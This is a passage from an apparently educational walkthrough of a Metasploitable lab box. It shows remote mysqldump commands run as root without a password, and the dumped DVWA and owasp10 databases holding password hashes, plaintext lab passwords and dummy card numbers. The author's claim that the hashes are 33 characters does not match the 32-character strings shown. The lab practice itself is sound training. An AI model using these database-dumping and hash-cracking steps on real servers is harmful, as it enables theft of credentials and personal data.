  `password` varchar(32) default NULL,
  `avatar` varchar(70) default NULL,
  PRIMARY KEY  (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin','admin','admin','5f4dcc3b5aa765d61d8327deb882cf99','http://172.16.123.129/dvwa/hackable/users/admin.jpg'),(2,'Gordon','Brown','gordonb','e99a18c428cb38d5f260853678922e03','http://172.16.123.129/dvwa/hackable/users/gordonb.jpg'),(3,'Hack','Me','1337','8d3533d75ae2c3966d7e0d4fcc69216b','http://172.16.123.129/dvwa/hackable/users/1337.jpg'),(4,'Pablo','Picasso','pablo','0d107d09f5bbe40cade3de5c71e9e9b7','http://172.16.123.129/dvwa/hackable/users/pablo.jpg'),(5,'Bob','Smith','smithy','5f4dcc3b5aa765d61d8327deb882cf99','http://172.16.123.129/dvwa/hackable/users/smithy.jpg');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2016-03-23 21:07:10

From this, we can see a couple of interesting things.

First, we have 5 users in this web app. The password field of the table consists of strings of 33 characters, in hex. I used Hash-Identifier to identify the hash. Looks like it is an MD5 hash. These are 32 characters, while these strings are 33 characters, so there'll be a little work on our side to figure out what's going on.

root@morpheus:~/box/metasploitable# python Hash_ID.py
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: 5f4dcc3b5aa765d61d8327deb882cf99

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))


Owasp10 Database

The owasp10 database has some juicy info too. One table has plain-text passwords.

root@morpheus:~/box/metasploitable# mysqldump --host=10.0.0.27 -u root owasp10 > owasp10.sql
root@morpheus:~/box/metasploitable# cat owasp10.sql
-- MySQL dump 10.13  Distrib 5.5.47, for debian-linux-gnu (x86_64)
--
-- Host: 10.0.0.27    Database: owasp10
-- ------------------------------------------------------
-- Server version	5.0.51a-3ubuntu5

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Not dumping tablespaces as no INFORMATION_SCHEMA.FILES table on this server
--

--
-- Table structure for table `accounts`
--

DROP TABLE IF EXISTS `accounts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `accounts` (
  `cid` int(11) NOT NULL auto_increment,
  `username` text,
  `password` text,
  `mysignature` text,
  `is_admin` varchar(5) default NULL,
  PRIMARY KEY  (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=17 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `accounts`
--

LOCK TABLES `accounts` WRITE;
/*!40000 ALTER TABLE `accounts` DISABLE KEYS */;
INSERT INTO `accounts` VALUES (1,'admin','adminpass','Monkey!','TRUE'),(2,'adrian','somepassword','Zombie Films Rock!','TRUE'),(3,'john','monkey','I like the smell of confunk','FALSE'),(4,'jeremy','password','d1373 1337 speak','FALSE'),(5,'bryce','password','I Love SANS','FALSE'),(6,'samurai','samurai','Carving Fools','FALSE'),(7,'jim','password','Jim Rome is Burning','FALSE'),(8,'bobby','password','Hank is my dad','FALSE'),(9,'simba','password','I am a cat','FALSE'),(10,'dreveil','password','Preparation H','FALSE'),(11,'scotty','password','Scotty Do','FALSE'),(12,'cal','password','Go Wildcats','FALSE'),(13,'john','password','Do the Duggie!','FALSE'),(14,'kevin','42','Doug Adams rocks','FALSE'),(15,'dave','set','Bet on S.E.T. FTW','FALSE'),(16,'ed','pentest','Commandline KungFu anyone?','FALSE');
/*!40000 ALTER TABLE `accounts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blogs_table`
--

DROP TABLE IF EXISTS `blogs_table`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blogs_table` (
  `cid` int(11) NOT NULL auto_increment,
  `blogger_name` text,
  `comment` text,
  `date` datetime default NULL,
  PRIMARY KEY  (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blogs_table`
--

LOCK TABLES `blogs_table` WRITE;
/*!40000 ALTER TABLE `blogs_table` DISABLE KEYS */;
INSERT INTO `blogs_table` VALUES (1,'adrian','Well, I\'ve been working on this for a bit. Welcome to my crappy blog software. :)','2009-03-01 22:26:12'),(2,'adrian','Looks like I got a lot more work to do. Fun, Fun, Fun!!!','2009-03-01 22:26:54'),(3,'anonymous','An anonymous blog? Huh? ','2009-03-01 22:27:11'),(4,'ed','I love me some Netcat!!!','2009-03-01 22:27:48'),(5,'john','Listen to Pauldotcom!','2009-03-01 22:29:04'),(6,'jeremy','Why give users the ability to get to the unfiltered Internet? It\'s just asking for trouble. ','2009-03-01 22:29:49'),(7,'john','Chocolate is GOOD!!!','2009-03-01 22:30:06'),(8,'admin','Fear me, for I am ROOT!','2009-03-01 22:31:13'),(9,'dave','Social Engineering is woot-tastic','2009-03-01 22:31:13'),(10,'kevin','Read more Douglas Adams','2009-03-01 22:31:13'),(11,'kevin','You should take SANS SEC542','2009-03-01 22:31:13'),(12,'asprox','Fear me, for I am asprox!','2009-03-01 22:31:13');
/*!40000 ALTER TABLE `blogs_table` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `captured_data`
--

DROP TABLE IF EXISTS `captured_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `captured_data` (
  `data_id` int(11) NOT NULL auto_increment,
  `ip_address` text,
  `hostname` text,
  `port` text,
  `user_agent_string` text,
  `referrer` text,
  `data` text,
  `capture_date` datetime default NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `captured_data`
--

LOCK TABLES `captured_data` WRITE;
/*!40000 ALTER TABLE `captured_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `captured_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `credit_cards`
--

DROP TABLE IF EXISTS `credit_cards`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `credit_cards` (
  `ccid` int(11) NOT NULL auto_increment,
  `ccnumber` text,
  `ccv` text,
  `expiration` date default NULL,
  PRIMARY KEY  (`ccid`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `credit_cards`
--

LOCK TABLES `credit_cards` WRITE;
/*!40000 ALTER TABLE `credit_cards` DISABLE KEYS */;
INSERT INTO `credit_cards` VALUES (1,'4444111122223333','745','2012-03-01'),(2,'7746536337776330','722','2015-04-01'),(3,'8242325748474749','461','2016-03-01'),(4,'7725653200487633','230','2017-06-01'),(5,'1234567812345678','627','2018-11-01');
/*!40000 ALTER TABLE `credit_cards` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hitlog`
--

DROP TABLE IF EXISTS `hitlog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hitlog` (
  `cid` int(11) NOT NULL auto_increment,
  `hostname` text,
  `ip` text,
  `browser` text,
  `referer` text,
  `date` datetime default NULL,
  PRIMARY KEY  (`cid`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hitlog`
--

LOCK TABLES `hitlog` WRITE;
/*!40000 ALTER TABLE `hitlog` DISABLE KEYS */;
/*!40000 ALTER TABLE `hitlog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pen_test_tools`
--

DROP TABLE IF EXISTS `pen_test_tools`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pen_test_tools` (
  `tool_id` int(11) NOT NULL auto_increment,
  `tool_name` text,
  `phase_to_use` text,
  `tool_type` text,
  `comment` text,
  PRIMARY KEY  (`tool_id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pen_test_tools`
--

LOCK TABLES `pen_test_tools` WRITE;
/*!40000 ALTER TABLE `pen_test_tools` DISABLE KEYS */;
INSERT INTO `pen_test_tools` VALUES (1,'WebSecurify','Discovery','Scanner','Can capture screenshots automatically'),(2,'Grendel-Scan','Discovery','Scanner','Has interactive-mode. Lots plug-ins. Includes Nikto. May not spider JS menus well.'),(3,'Skipfish','Discovery','Scanner','Agressive. Fast. Uses wordlists to brute force directories.'),(4,'w3af','Discovery','Scanner','GUI simple to use. Can call sqlmap. Allows scan packages to be saved in profiles. Provides evasion, discovery, brute force, vulneraility assessment (audit), exploitation, pattern matching (grep).'),(5,'Burp-Suite','Discovery','Scanner','GUI simple to use. Provides highly configurable manual scan assistence with productivity enhancements.'),(6,'Netsparker Community Edition','Discovery','Scanner','Excellent spider abilities and reporting. GUI driven. Runs on Windows. Good at SQLi and XSS detection. From Mavituna Security. Professional version available for purchase.'),(7,'NeXpose','Discovery','Scanner','GUI driven. Runs on Windows. From Rapid7. Professional version available for purchase. Updates automatically. Requires large amounts of memory.'),(8,'Hailstorm','Discovery','Scanner','From Cenzic. Professional version requires dedicated staff, multiple dediciated servers, professional pen-tester to analyze results, and very large license fee. Extensive scanning ability. Very large vulnerability database. Highly configurable. Excellent reporting. Can scan entire networks of web applications. Extremely expensive. Requires large amounts of memory.'),(9,'Tamper Data','Discovery','Interception Proxy','Firefox add-on. Easy to use. Tampers with POST parameters and HTTP Headers. Does not tamper with URL query parameters. Requires manual browsing.'),(10,'DirBuster','Discovery','Fuzzer','OWASP tool. Fuzzes directory names to brute force directories.'),(11,'SQL Inject Me','Discovery','Fuzzer','Firefox add-on. Attempts common strings which elicit XSS responses. Not compatible with Firefox 8.0.'),(12,'XSS Me','Discovery','Fuzzer','Firefox add-on. Attempts common strings which elicit responses from databases when SQL injection is present. Not compatible with Firefox 8.0.'),(13,'GreaseMonkey','Discovery','Browser Manipulation Tool','Firefox add-on. Allows the user to inject JavaScripts and change page.'),(14,'NSLookup','Reconnaissance','DNS Server Query Tool','DNS query tool can query DNS name or reverse lookup on IP. Set debug for better output. Premiere tool on Windows but Linux perfers Dig. DNS traffic generally over UDP 53 unless response long then over TCP 53. Online version combined with anonymous proxy or TOR network may be prefered for stealth.'),(15,'Whois','Reconnaissance','Domain name lookup service','Whois is available in Linux naitvely and Windows as a Sysinternals download plus online. Whois can lookup the registrar of a domain and the IP block associated. An online version is http://network-tools.com/'),(16,'Dig','Reconnaissance','DNS Server Query Tool','The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers.'),(17,'Fierce Domain Scanner','Reconnaissance','DNS Server Query Tool','Powerful DNS scan tool. FDS is a Perl program which scans and reverse scans a domain plus scans IPs within the same block to look for neighoring machines. Available in the Samurai and Backtrack distributions plus http://ha.ckers.org/fierce/'),(18,'host','Reconnaissance','DNS Server Query Tool','A simple DNS lookup tool included with BIND. The tool is a friendly and capible command line tool with excellent documentation. Does not posess the automation of FDS.'),(19,'zaproxy','Reconnaissance','Interception Proxy','OWASP Zed Attack Proxy. An interception proxy that can also passively or actively scan applications as well as perform brute-forcing. Similar to Burp-Suite without the disadvantage of requiring a costly license.'),(20,'Google intitle','Discovery','Search Engine','intitle and site directives allow directory discovery. GHDB available to provide hints. See Hackers for Charity site.');
/*!40000 ALTER TABLE `pen_test_tools` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2016-03-23 21:11:15
